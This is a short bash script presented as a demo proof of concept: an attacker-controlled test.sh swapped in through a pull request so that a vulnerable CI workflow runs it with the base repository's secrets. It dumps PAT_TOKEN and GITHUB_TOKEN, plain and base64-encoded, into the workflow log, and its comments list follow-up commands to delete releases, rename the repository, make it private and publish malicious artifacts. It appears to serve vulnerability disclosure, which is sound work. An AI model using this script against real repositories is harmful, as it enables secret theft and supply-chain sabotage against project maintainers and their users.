#!/bin/bash
# DEMO — Attacker-controlled test.sh submitted via PR
# This replaces scripts/test.sh in the attacker's fork
# When the vulnerable workflow runs this, it has full access to secrets

echo "[attacker] Workflow triggered with base repo permissions"

# Step 1: Exfiltrate the token
# In a real attack: curl to attacker server with the token
echo "[attacker] PAT_TOKEN is: ${PAT_TOKEN}"
echo "[attacker] Encoded PAT_TOKEN: $(echo ${PAT_TOKEN} | base64)"
echo "[attacker] Done. Decode with: echo <token> | base64 -d"
echo "[attacker] GITHUB_TOKEN is: ${GH_TOKEN}"
echo "[attacker] Encoded GITHUB_TOKEN: $(echo ${GH_TOKEN} | base64)"

# Step 2: With a real PAT, the attacker would now:
#   - Delete releases:      gh release delete v0.69.1 --yes
#   - Rename the repo:      gh api repos/OWNER/REPO -X PATCH -f name=new-name
#   - Make repo private:    gh api repos/OWNER/REPO -X PATCH -f private=true
#   - Publish malicious artifact to registries

echo "[attacker] Done. Token exfiltrated."
